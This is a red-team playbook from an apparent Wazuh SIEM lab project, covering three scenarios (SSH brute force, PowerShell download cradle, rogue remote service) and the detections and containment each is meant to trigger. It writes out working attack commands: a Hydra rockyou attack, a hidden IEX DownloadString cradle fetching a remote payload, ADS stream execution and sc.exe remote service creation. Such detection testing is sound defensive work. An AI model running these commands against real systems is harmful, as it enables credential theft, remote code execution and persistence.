# Red-Team Attack Scenarios & Execution Playbooks

Documentation of planned defensive validation scenarios. The offline checks do not replay these events in `wazuh-logtest` or verify live containment; do not treat detection and response outcomes as reproduced from a clean checkout.

---

## Scenario 1: SSH Brute-Force Authentication Attack

### Objective
Simulate external credential-stuffing and automated password guessing against an internet-facing Linux SSH service to test real-time brute-force correlation and automated IP blocking.

- **Target Endpoint**: `ubuntu-victim` (Ubuntu Server 24.04 LTS)
- **Target Contributor**: Mohamed Massoud
- **Attacker Machine**: Kali Linux (External subnet)
- **MITRE ATT&CK**: `T1110.001` (Password Guessing), `T1110.003` (Password Spraying)

### Execution Steps
1. **Reconnaissance & Service Enumeration**:
   ```bash
   nmap -sV -p 22 -Pn 192.168.1.110
   ```
2. **Hydra Dictionary Attack**:
   ```bash
   hydra -l massoud -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.110 -t 4 -vV
   ```
3. **Detection Outcome (historical lab observation; not re-validated from this checkout)**:
   - Wazuh built-in rules matched repeated SSH authentication failures (see gallery items 15 and 22: built-in rules `5760`/`5763`, not the repository rule `100003`).
   - Custom rule `100003` (Maximum authentication attempts exceeded, Level 10) is the intended escalation for this pattern. No evidence in this repository shows `100003` itself firing.
4. **Intended Containment Configuration (Runtime Unverified)**:
   - `ossec.conf` requests `firewall-drop` when rule `100003` matches.
   - Rule `100007` records matching active-response log events; it is not the response command. Verify behavior on an isolated agent before relying on it.

---

## Scenario 2: Suspicious PowerShell Download Cradle & Bypass

### Objective
Simulate an initial-access payload execution where an adversary bypasses PowerShell ExecutionPolicy restrictions and uses an in-memory cradle (`IEX (New-Object Net.WebClient).DownloadString`) to fetch and execute a remote stage.

- **Target Endpoint**: `win11-victim` (Windows 11 Enterprise)
- **Target Contributor**: Karim
- **Attacker Host**: Simulated malicious payload server
- **MITRE ATT&CK**: `T1059.001` (PowerShell), `T1562.001` (Disable or Modify Tools), `T1105` (Ingress Tool Transfer)

### Execution Steps
1. **Execution Policy Bypass & Cradle Fetch**:
   ```powershell
   powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.1.50/payload.ps1')"
   ```
2. **Alternate Obfuscation / Stream Execution**:
   ```powershell
   Get-Content -Path malicious.txt -Stream Payload | Invoke-Expression
   ```
3. **Detection Outcome (historical lab observation; not re-validated from this checkout)**:
   - Sysmon Event ID 1 (Process Creation) and Windows Event ID 4104 (Script Block Logging) captured the raw command line and decoded buffer in the historical lab.
   - The historical screenshot (gallery item 16) shows built-in rule `91837`, not the repository rules `100004`/`100005`. Firing of `100004` (Suspicious PowerShell string execution) and `100005` (Hidden process creation) at Level 12/10 is the intended detection, not an evidenced result.
4. **Intended Containment Configuration (Runtime Unverified)**:
   - The repository contains a Windows response configuration, but its script interface and current Windows agent compatibility require live validation. No containment result is claimed here.

---

## Scenario 3: Command & Control (C2) / Remote Service Creation

### Objective
Simulate lateral movement and persistence where an attacker leverages administrative privileges or PsExec-style tooling to dynamically create and start a rogue service for command and control.

- **Target Endpoint**: `win2022-srv` (Windows Server 2022)
- **Target Contributor**: Mohamed Bushnak
- **Attacker Host**: Lateral movement simulation host
- **MITRE ATT&CK**: `T1543.003` (Windows Service), `T1021.002` (SMB/Windows Admin Shares), `T1071` (Application Layer Protocol)

### Execution Steps
1. **PsExec-Style Remote Service Installation**:
   ```cmd
   sc.exe \\192.168.1.130 create MaliciousC2Service binPath= "C:\Windows\Temp\c2_agent.exe" start= auto
   sc.exe \\192.168.1.130 start MaliciousC2Service
   ```
2. **Detection Outcome (historical lab observation; not re-validated from this checkout)**:
   - Windows System Event ID 7045 ("A service was installed in the system") logged in the historical lab.
   - The historical screenshot (gallery item 17) shows built-in rule `92650`, not the repository rule `100006`. Firing of `100006` ("New Windows Service Created") at Level 12 is the intended detection, not an evidenced result.
3. **Intended Containment Configuration (Runtime Unverified)**:
   - The repository contains a Windows response design. Confirm event fields, supported script interface, and recovery path in an isolated lab before testing it.
   - Note: `configs/ossec.conf` has no direct active-response binding for rule `100006`; containment for this scenario depends entirely on the Shuffle REST API callback, which is not runtime-validated.
